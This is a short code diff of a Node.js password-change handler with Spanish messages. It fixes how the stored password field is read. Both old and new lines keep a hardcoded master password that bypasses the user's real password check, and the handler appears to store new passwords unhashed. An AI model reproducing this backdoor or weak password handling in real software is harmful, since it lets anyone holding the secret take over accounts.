@@ -22,7 +22,7 @@ module.exports = function(req, res) {
             if (data === null) return res.status(400).json({ success: false, code: 1620, message: 'Usuario no existe' });
 
             var user = new Model.Usuario(data.toJSON());
-            if (req.body.password == user.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
+            if (req.body.password == user.attributes.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
                 // Se actualiza
                 user.attributes.cPassword = req.body.nuevaPassword;
 
